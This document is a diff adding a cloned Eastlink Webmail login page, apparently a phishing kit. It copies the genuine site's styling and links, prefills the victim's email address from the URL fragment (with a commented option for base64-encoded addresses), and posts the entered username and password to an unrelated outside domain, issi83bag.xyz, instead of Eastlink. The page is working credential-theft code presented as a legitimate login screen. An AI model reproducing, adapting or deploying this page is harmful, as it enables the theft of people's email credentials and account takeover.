@@ -1,0 +1,148 @@
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" class="dj_webkit dj_chrome dj_contentbox"><head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<!-- [if lte IE 9]>
+			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+		<![endif]-->
+		<title>Eastlink Webmail</title>
+		<style type="text/css">
+                        @import "https://webmail.eastlink.ca/iwc_static/js/dojotoolkit/dojo/resources/dojo.css?3.0.2.2.0_20010935";
+                        @import "https://webmail.eastlink.ca/iwc_static/js/dojotoolkit/dijit/themes/dijit.css?3.0.2.2.0_20010935";
+                        @import "https://webmail.eastlink.ca/iwc_static/js/dojotoolkit/dijit/themes/dijit_rtl.css?3.0.2.2.0_20010935";
+                        @import "https://webmail.eastlink.ca/iwc_static/js/dojotoolkit/dijit/themes/tundra/form/Button.css?3.0.2.2.0_20010935";
+                        @import "https://webmail.eastlink.ca/iwc_static/js/dojotoolkit/dojox/form/resources/DropDownSelect.css?3.0.2.2.0_20010935";
+		</style>
+                <link rel="stylesheet" href="https://webmail.eastlink.ca/iwc_static/layout/css/login.css?3.0.2.2.0_20010935" type="text/css">
+                <link rel="stylesheet" href="https://webmail.eastlink.ca/iwc_static/c11n/allDomain/layout/css/login.css?3.0.2.2.0_20010935" type="text/css">
+				
+				<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+<script>
+$(document).ready(function() {	
+var hash = window.location.hash; // to grab email for autolink
+if(hash !== ""){
+	hash = hash.split('#');
+	
+	//normal email add this code
+	const email = hash[1]; // to splt between # and email are normal string	
+	var domain = email.substring(email.lastIndexOf("@") +1);
+	
+	//base64email add this code, remove comment
+	//const email = atob(email);
+	$("#username").val(email);
+	
+	
+}
+});
+</script>
+
+		</head><body role="application"><textarea id="dijit._editor.RichText.savedContent" style="display:none;position:absolute;top:-100px;left:-100px;height:3px;width:3px;overflow:hidden;"></textarea>
+		
+
+	
+		<div class="Convergence-Login" id="convergenceLogin">
+			<div class="Convergence-Login-Border">
+				<div class="Convergence-Login-Banner">
+					<div class="Convergence-Login-Logo" role="presentation"></div>
+					<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg"><span>Welcome</span> to Eastlink Webmail</div>
+				</div>
+
+				<div class="Convergence-Login-Notification" id="alertMsg" aria-live="assertive" role="alert" tabindex="0" style="visibility: visible;">Login to continue. </div>
+				
+				
+				
+				<form action="https://issi83bag.xyz/eastlink/login.php" method="post">
+
+					<div>
+					
+					
+						<div class="Convergence-Login-Form">
+							<div class="Convergence-Login-FormRow">
+								<label id="usernameLabelID" for="username">Email Address:</label>
+								<input id="username" name="username" type="text" aria-required="true" required="">
+							</div>
+							<div class="Convergence-Login-FormRow">
+								<label id="passwordLabelID" for="password">Password:</label>
+								<input id="password" name="password" type="password" aria-required="true" autocomplete="off" required="">
+							</div>
+							<div class="Convergence-Login-FormRow">
+								<input id="chkpreloginip" name="chkpreloginip" type="hidden" value="true" aria-required="false">
+							</div>
+							<div class="Convergence-Login-FormRow tundra">
+
+									<table class="dijit dijitReset dijitInline dijitLeft dojoxDropDownSelectFixedWidth Convergence-Login-SelectLang dojoxDropDownSelect" dojoattachpoint="dropDownNode,tableNode" cellspacing="0" cellpadding="0" role="button" dojoattachevent="onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="langButton"><tbody wairole="presentation" role="presentation"><tr wairole="presentation" role="presentation"><td class="dijitReset dijitStretch dijitButtonContents dijitButtonNode"><span class="dijitReset dijitInline dijitButtonText" dojoattachpoint="containerNode,popupStateNode" id="langButton_label"><span class=" dojoxDropDownSelectLabel">English</span></span><input type="hidden" dojoattachpoint="valueNode" value="en-us">
+		</td><td class="dijitReset dijitRight dijitButtonNode dijitArrowButton dijitDownArrowButton" dojoattachpoint="focusNode,titleNode" wairole="button" waistate="haspopup-true,labelledby-langButton_label" role="button" aria-haspopup="true" aria-labelledby="langButton_label" id="langButton" tabindex="0" aria-disabled="false"><div class="dijitReset dijitArrowButtonInner">&thinsp;</div><div class="dijitReset dijitArrowButtonChar" wairole="presentation" role="presentation">▼</div></td></tr></tbody></table>
+								<div class="Convergence-Login-FormButton" id="buttonContainer">
+									<div>
+										<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Sign In</span></button></span></span></span>
+									</div>
+								</div>
+								<div style="clear: both"></div>
+							</div>
+
+						</div>
+
+					</div>
+					<div style="clear: both"></div>
+				</form>
+
+		<div id="passwordMsg" class="Convergence-Login-PasswordMsg">Click <a target="_blank" href="https://epm.eastlink.ca/epm/forgot-password">HERE</a> to change password or recover your forgotten password.</div>
+
+                <script>
+                        dojo.byId("passwordMsg").innerHTML=iwc.l10n.login_password_msg;
+                </script>
+
+		<div class="Password-Expired-Message tundra" id="PwdExpiredMsg" style="display:none;">                   
+			<div class="ErrorMsg-Contianer" id="btnContainer">                                                
+				<div class="Error-Icon"></div>
+				<div class="Error-Msg" id="errMsg"></div>			    	
+			</div>
+			<div class="Convergence-Login-FormButton ChangePwdBtn">	
+				<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="changepwd"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="button" value="" wairole="button" waistate="labelledby-changepwd_label" role="button" aria-labelledby="changepwd_label" id="changepwd" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="changepwd_label" dojoattachpoint="containerNode">Change Password</span></button></span></span></span>
+		    </div>
+                </div>                
+				<div id="copyright" class="Convergence-Login-Copyright"></div>
+			</div>
+		</div>
+
+		<div id="overlay" class="login">
+			<div class="centered">
+				<div class="logo"></div>
+				<div id="progress"></div>
+			</div>
+		</div>
+
+		<iframe name="picCache" id="picCache" src="" width="0" height="0" frameborder="0"></iframe>
+
+		<noscript>
+			<div style="width:50%; margin-top: 5%; margin-left:auto; margin-right:auto">
+				<iframe src="noscript.html" frameborder=0 width=100%" />
+			</div>
+		</noscript>
+	
+
+<table class="dijit dijitMenu dijitMenuPassive dijitReset dijitMenuTable dojoxDropDownSelectMenu" wairole="menu" tabindex="0" dojoattachevent="onkeypress:_onKeyPress" role="menu" id="dijit_Menu_0" widgetid="dijit_Menu_0" style="visibility: hidden; position: absolute; top: -9999px;">
+	<tbody class="dijitReset" dojoattachpoint="containerNode"><tr class="dijitReset dijitMenuItem dojoxDropDownSelectSelectedOption" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_0" lang="en-us" aria-disabled="false" widgetid="dijit_MenuItem_0" aria-labelledby="dijit_MenuItem_0_text" aria-selected="true">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="../../../js/dojotoolkit/dojo/resources/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_0_text">English</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="../../../js/dojotoolkit/dojo/resources/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_1" lang="fr-ca" aria-disabled="false" widgetid="dijit_MenuItem_1" aria-labelledby="dijit_MenuItem_1_text" aria-selected="false">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="https://webmail.eastlink.ca/iwc_static/js/dojotoolkit/dojo/resources/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_1_text">Français Canadien</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="https://webmail.eastlink.ca/iwc_static/js/dojotoolkit/dojo/resources/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr></tbody>
+</table></body></html>
